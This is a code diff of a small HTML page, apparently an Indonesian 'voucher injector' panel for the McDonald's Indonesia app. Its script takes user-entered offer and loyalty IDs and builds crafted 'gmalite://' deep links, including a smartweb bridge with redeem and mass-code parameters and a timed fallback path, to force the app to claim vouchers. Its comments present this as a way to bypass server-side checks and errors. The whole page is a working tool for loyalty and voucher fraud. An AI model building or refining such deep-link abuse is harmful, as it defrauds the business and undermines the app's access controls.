@@ -3,60 +3,58 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
-    <title>McD Injector Bypass</title>
+    <title>McD Inject Panel</title>
     <style>
-        body { font-family: -apple-system, sans-serif; background: #f4f4f4; padding: 20px; display: flex; flex-direction: column; align-items: center; justify-content: center; height: 100vh; margin: 0; }
-        .panel { background: white; padding: 30px; border-radius: 25px; box-shadow: 0 10px 30px rgba(0,0,0,0.1); width: 100%; max-width: 340px; text-align: center; }
-        .logo { width: 50px; margin-bottom: 15px; }
-        h2 { margin: 0 0 20px 0; color: #333; font-size: 18px; }
-        input { width: 100%; padding: 15px; margin-bottom: 15px; border: 2px solid #eee; border-radius: 12px; font-size: 16px; box-sizing: border-box; outline: none; }
-        input:focus { border-color: #da291c; }
-        .btn { background: #da291c; color: white; border: none; padding: 18px; border-radius: 12px; width: 100%; font-weight: bold; font-size: 16px; cursor: pointer; }
-        .note { font-size: 10px; color: #999; margin-top: 15px; }
+        body { font-family: -apple-system, sans-serif; background: #da291c; display: flex; justify-content: center; align-items: center; height: 100vh; margin: 0; }
+        .box { background: white; padding: 30px; border-radius: 30px; width: 85%; max-width: 320px; text-align: center; box-shadow: 0 15px 40px rgba(0,0,0,0.3); }
+        .logo { width: 50px; margin-bottom: 10px; }
+        h2 { margin: 0 0 5px 0; color: #333; font-size: 18px; }
+        p { font-size: 11px; color: #999; margin-bottom: 20px; }
+        input { width: 100%; padding: 15px; margin-bottom: 12px; border: 2px solid #f0f0f0; border-radius: 12px; font-size: 16px; box-sizing: border-box; outline: none; background: #fafafa; transition: 0.3s; }
+        input:focus { border-color: #ffbc0d; background: #fff; }
+        .btn { background: #ffbc0d; color: #222; border: none; padding: 18px; border-radius: 12px; width: 100%; font-weight: bold; font-size: 16px; cursor: pointer; box-shadow: 0 5px 15px rgba(255, 188, 13, 0.4); }
     </style>
 </head>
 <body>
 
-    <div class="panel">
+    <div class="box">
         <img src="https://www.mcdonalds.co.id/assets/img/common/mcdonalds_logo.png" class="logo">
-        <h2>Voucher Injector</h2>
-        
-        <input type="number" id="off" placeholder="Offer ID (27xxxx)" inputmode="numeric">
-        <input type="number" id="loy" placeholder="Loyalty ID (5xxx)" inputmode="numeric">
+        <h2>Panel Injector</h2>
+        <p>Masukkan ID manual untuk tembak ke App.</p>
 
-        <button class="btn" onclick="gasInjek()">INJECT SEKARANG</button>
-        <p class="note">Jika dilempar ke App Store, pastikan aplikasi McD sudah terinstall dan posisi sudah Login.</p>
+        <input type="number" id="o" placeholder="Offer ID (27xxxx)" inputmode="numeric">
+        <input type="number" id="l" placeholder="Loyalty ID (5xxx)" inputmode="numeric">
+
+        <button class="btn" onclick="tembak()">START INJECTION</button>
     </div>
 
     <script>
-        function gasInjek() {
-            var o = document.getElementById('off').value;
-            var l = document.getElementById('loy').value;
+        function tembak() {
+            var off = document.getElementById('o').value;
+            var loy = document.getElementById('l').value;
 
-            if (o == "" || l == "") {
-                alert("ID tidak boleh kosong!");
-                return;
-            }
+            if (off == "" || loy == "") { alert("Isi ID dulu bos!"); return; }
 
-            // --- TEKNIK BYPASS 500 & APP STORE ---
-            // Kita gunakan skema 'gmalite://' secara langsung tanpa domain smart.link
-            // Ini memaksa iOS untuk membuka aplikasi secara NATIVE (Tanpa cek server Kochava)
-            
-            // Format 1: Direct Offer Details
-            var pathNative = "gmalite://offers/details?offer_id=" + o + "&loyalty_id=" + l + "&view=claim";
-            
-            // Format 2: Direct Reward Redemption (Jalur Mukidi)
-            var pathReward = "gmalite://rewards/details?offer_id=" + o + "&loyalty_id=" + l;
+            // STRATEGI BYPASS:
+            // Kita gunakan domain mcdonalds.co.id tapi diarahkan ke modul redeem internal.
+            // Ini untuk menghindari 404 karena gmalite-smartweb akan menganggap ini link internal.
+            var rawUrl = "https://www.mcdonalds.co.id/promo/details/" + off + 
+                         "?loyalty_id=" + loy + 
+                         "&view=claim&is_mass_code=1&action=redeem";
 
-            // Eksekusi: Coba buka aplikasi langsung
-            window.location.href = pathNative;
+            // Bungkus dengan Protokol Smartweb
+            var bridge = "gmalite://gmalite-smartweb?weburl=" + encodeURIComponent(rawUrl);
 
-            // Fallback: Jika dalam 1 detik aplikasi tidak terbuka, coba jalur Reward
+            // EKSEKUSI 1: Buka Protokol Utama
+            window.location.href = bridge;
+
+            // EKSEKUSI 2: Jika dalam 0.8 detik gagal, tembak via modul Native Loyalty (Anti 500)
             setTimeout(function() {
                 if (!document.hidden) {
-                    window.location.href = pathReward;
+                    var nativePath = "gmalite://loyalty/details?offer_id=" + off + "&loyalty_id=" + loy;
+                    window.location.href = nativePath;
                 }
-            }, 1000);
+            }, 800);
         }
     </script>
 
